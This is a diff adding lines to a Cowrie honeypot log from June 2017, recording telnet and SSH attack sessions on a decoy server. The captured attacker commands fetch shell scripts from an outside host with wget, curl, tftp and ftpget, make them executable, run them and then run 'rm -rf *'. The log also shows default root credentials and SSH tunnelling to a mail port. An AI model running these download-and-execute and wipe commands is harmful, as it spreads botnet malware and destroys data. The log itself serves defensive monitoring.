@@ -4422,3 +4422,62 @@
 2017-06-09T03:10:00+0000 [CowrieTelnetTransport,30677,94.177.215.194] Command found: wget http://173.0.52.188/fyfa.sh
 2017-06-09T03:10:00+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://173.0.52.188/fyfa.sh>
 2017-06-09T03:10:00+0000 [CowrieTelnetTransport,30677,94.177.215.194] QUEUED INPUT: /bin/busybox cat /proc/mounts; /bin/busybox ECCHI
+2017-06-09T03:10:03+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,13260,91.195.103.216] got channel 'direct-tcpip' request
+2017-06-09T03:10:03+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,13260,91.195.103.216] direct-tcp connection request to 188.125.69.79:25 from localhost:5556
+2017-06-09T03:10:03+0000 [HTTPPageDownloader,client] Not storing duplicate content 7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814
+2017-06-09T03:10:03+0000 [HTTPPageDownloader,client] Downloaded URL (http://173.0.52.188/fyfa.sh) with SHA-256 7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814 to dl/7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814
+2017-06-09T03:10:03+0000 [HTTPPageDownloader,client] Command found: curl -O http://173.0.52.188/fyfa.sh
+2017-06-09T03:10:03+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://173.0.52.188/fyfa.sh>
+2017-06-09T03:10:03+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://173.0.52.188/fyfa.sh>
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] Not storing duplicate content 7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] Downloaded URL (http://173.0.52.188/fyfa.sh) with SHA-256 7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814 to dl/7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] Command found: chmod 777 /tmp/fyfa.sh
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] Command found: sh /tmp/fyfa.sh
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] Command found: tftp 173.0.52.188 -c get tfyfa.sh
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] Command found: chmod 777 tfyfa.sh
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] Command found: sh tfyfa.sh
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] Command found: tftp -r tfyfa2.sh -g 173.0.52.188
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] Command found: chmod 777 tfyfa2.sh
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] Command found: sh tfyfa2.sh
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 173.0.52.188 ftp1.sh ftp1.sh
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] FTP connect failed: host=173.0.52.188, port=21, err=[Errno 111] Connection refused
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] Command found: /bin/busybox cat /proc/mounts; /bin/busybox ECCHI
+2017-06-09T03:10:05+0000 [HTTPPageDownloader,client] Command found: cat /proc/mounts; /bin/busybox ECCHI
+2017-06-09T03:10:05+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://173.0.52.188/fyfa.sh>
+2017-06-09T03:10:07+0000 [CowrieTelnetTransport,30665,109.236.83.181] Connection lost after 161 seconds
+2017-06-09T03:10:08+0000 [SSHChannel None (30) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13260,91.195.103.216] remote eof
+2017-06-09T03:10:08+0000 [SSHChannel None (30) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13260,91.195.103.216] remote close
+2017-06-09T03:10:08+0000 [SSHChannel None (30) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13260,91.195.103.216] sending close 30
+2017-06-09T03:10:08+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,13260,91.195.103.216] got channel 'direct-tcpip' request
+2017-06-09T03:10:08+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,13260,91.195.103.216] direct-tcp connection request to 188.125.69.79:25 from localhost:5556
+2017-06-09T03:10:13+0000 [SSHChannel None (31) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13260,91.195.103.216] remote eof
+2017-06-09T03:10:13+0000 [SSHChannel None (31) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13260,91.195.103.216] remote close
+2017-06-09T03:10:13+0000 [SSHChannel None (31) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13260,91.195.103.216] sending close 31
+2017-06-09T03:10:15+0000 [CowrieTelnetTransport,30675,94.177.215.194] Connection lost after 91 seconds
+2017-06-09T03:10:27+0000 [CowrieTelnetTransport,30679,94.177.215.194] Connection lost after 103 seconds
+2017-06-09T03:10:27+0000 [CowrieTelnetTransport,30678,94.177.215.194] Connection lost after 103 seconds
+2017-06-09T03:10:38+0000 [CowrieTelnetTransport,30677,94.177.215.194] Not storing duplicate content 7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814
+2017-06-09T03:10:38+0000 [CowrieTelnetTransport,30677,94.177.215.194] Saved redir contents with SHA-256 7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814 to dl/7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814
+2017-06-09T03:10:38+0000 [CowrieTelnetTransport,30677,94.177.215.194] Not storing duplicate content 7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814
+2017-06-09T03:10:38+0000 [CowrieTelnetTransport,30677,94.177.215.194] Saved redir contents with SHA-256 7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814 to dl/7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814
+2017-06-09T03:10:38+0000 [CowrieTelnetTransport,30677,94.177.215.194] Not storing duplicate content 7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814
+2017-06-09T03:10:38+0000 [CowrieTelnetTransport,30677,94.177.215.194] Saved redir contents with SHA-256 7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814 to dl/7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814
+2017-06-09T03:10:38+0000 [CowrieTelnetTransport,30677,94.177.215.194] Not storing duplicate content 7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814
+2017-06-09T03:10:38+0000 [CowrieTelnetTransport,30677,94.177.215.194] Saved redir contents with SHA-256 7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814 to dl/7dbc8665782ee354b20a630313749849e2d8bc0afd5d8773632279d688ef1814
+2017-06-09T03:10:38+0000 [CowrieTelnetTransport,30677,94.177.215.194] Closing TTY Log: log/tty/20170609-030910-None-30677i.log after 87 seconds
+2017-06-09T03:10:38+0000 [CowrieTelnetTransport,30677,94.177.215.194] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-09T03:10:38+0000 [CowrieTelnetTransport,30677,94.177.215.194] Connection lost after 114 seconds
+2017-06-09T03:10:49+0000 [CowrieTelnetTransport,30669,109.236.83.181] Connection lost after 174 seconds
+2017-06-09T03:10:50+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 94.177.215.194:41248 (10.8.41.81:2223) [session: TT30684]
+2017-06-09T03:10:50+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 94.177.215.194:59477 (10.8.41.81:2223) [session: TT30685]
+2017-06-09T03:10:55+0000 [CowrieTelnetTransport,30684,94.177.215.194] login attempt: 146
+2017-06-09T03:10:55+0000 [CowrieTelnetTransport,30684,94.177.215.194] login return, expect: [root/54321]
+2017-06-09T03:10:57+0000 [CowrieTelnetTransport,30684,94.177.215.194] login attempt [root/54321] succeeded
+2017-06-09T03:10:59+0000 [CowrieTelnetTransport,30684,94.177.215.194] Opening TTY Log: log/tty/20170609-031059-None-30684i.log
+2017-06-09T03:10:59+0000 [CowrieTelnetTransport,30684,94.177.215.194] Warning: state changed and new state returned
+2017-06-09T03:10:59+0000 [CowrieTelnetTransport,30685,94.177.215.194] login attempt: 147
+2017-06-09T03:10:59+0000 [CowrieTelnetTransport,30685,94.177.215.194] login return, expect: [root/54321]
